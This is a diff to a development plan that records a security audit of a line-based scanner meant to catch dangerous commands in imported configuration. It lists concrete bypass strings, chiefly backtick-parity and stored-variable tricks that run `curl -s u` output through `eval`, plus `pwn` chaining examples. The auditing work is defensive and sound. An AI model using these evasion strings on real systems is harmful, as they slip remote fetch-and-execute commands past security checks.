@@ -501,6 +501,61 @@ Test: `npm run ci:local`.
 
 Then `workflow-report .` and `/agent-skills:review`.
 
+Result: run at `9868c71`, and it stopped the branch. Step 11's numbers reproduced: of 145,026,303 strings, master refused 10,816,587
+that the branch passed. Mapped strictly to the Known limits text, 3,513,843 of them in 28 buckets fall outside the list, all one
+family (B below). Family A came from hand-tried strings; the corpus doesn't produce it or labels it as the even-backtick limit. No
+finding is a new capability: `e=eval; $e "$(curl -s u)"` passes both patterns. No follow-up step is written yet, because the choice
+below decides what it is. The cause is that parity counts literal backticks, not shell or Markdown ones, so the count can't be made
+sound.
+
+A. Closing-half `eval` behind one backtick that doesn't open a span. Master refuses these. Each imported through the real CLI, exit 0,
+and the shell lines ran the payload through `eval` in `bash` and `dash` (checked again outside the audit, against a control). In the
+audit's matrix, 168 of 180 cases passed the branch and 154 ran through `eval`.
+
+````text
+: \`; `true`eval` curl -s u`
+: '`'; `true`eval` curl -s u`
+``` `true`eval` curl -s u` ```
+A lone ` is literal. Now run `true`eval` curl -s u`
+| a` | `true`eval` curl -s u` |
+````
+
+B. A backticked `eval` with an even count before it, followed by something Known limits doesn't list: the end of the line,
+punctuation, or a shell operator. `` `eval`;pwn `` and `` `eval`&&pwn `` import and run `pwn` as its own command. None of 7,829 sampled
+strings ran through `eval`.
+
+Sentences in Known limits that are false or imprecise:
+
+- "`pwn` runs as its own command, not through `eval`" is false under A.
+- The double-quote limit's `"eval"; pwn` covers lines where the payload does run through `eval`, because `"eval"` is the value of a
+  stored or substituted command: `$(echo "eval") "$(curl -s u)"`, `x="eval"; $x "$(curl -s u)"`, `set -- "eval"; "$@" "$(curl -s u)"`.
+- Mixed case on a closed-list word (`PrImEvAl(x)`) is not stated.
+
+Clean: case folding (38.2M probes, nothing folds to ASCII), 0 hits on 21,718 catalog lines, and timing, linear at worst 59.5 ms on a
+1 MiB line. That worst case is a backtick fill the plan's 15 lines missed. `RangeError` starts at 4.03 MiB of backticks and fails
+closed; a source over 1,024 KiB never reaches the scanner, run through `import` and `check --trust`.
+
+CLI evidence for the PR body, on the branch at `9868c71`:
+
+| Run                                        | Result                                                       |
+| ------------------------------------------ | ------------------------------------------------------------ |
+| Quoted-URL import                          | Refused, exit 1, nothing written (master: exit 0, 1 written) |
+| 256 KiB line of `curl `, real CLI          | 18.0 s, of which `config/exfil-in-command` is 17.0 s         |
+| Same line, `config/dangerous-command` only | 3.8 ms                                                       |
+
+`/agent-skills:review` of `e31dba3..HEAD`, outside the audit's findings:
+
+- The docs overstate what passes. `` `eval` `` "unless it is glued to more text" is wrong both ways: `` `eval`-like `` is glued and
+  passes, and `` `eval` "$x" `` isn't glued and is refused. `"eval"` passes only before `,` `.` `;` `:` `)` `]` `}` or the end of the line, not all punctuation: `"eval"?`,
+  `"eval"!`, `use "eval"/"exec"`, `"eval" (see below)` and `"eval" or "exec"` are refused.
+- Parity refuses prose, undocumented: ` ``a`b``and `eval` `, and``Escape a \` before `eval`.``.
+- Known limits lives only in this plan, and plans are deleted after merge. The accepted shapes need a home in
+  `docs/decisions/` or `docs/reference/spec.md`.
+- 12 of 33 mutants of the step 11 pieces survive `npm test`: the parity group for three pairs before `eval`; `` `eval` `` followed by
+  `$`, `(`, `"` or `` ` ``; `"eval"` before `.`, `;`, `:`, `]` or `}`; `\s*` before the bracket in the quoted call, needed only by the
+  backtick form; and `]` in its tail.
+- The `rules.ts` comment says "not a word named in prose", and `"eval" is dangerous` is one.
+
 ## Known limits
 
 The scanner is a pattern check on one line at a time, not a sandbox. This plan doesn't change that, and these still pass:
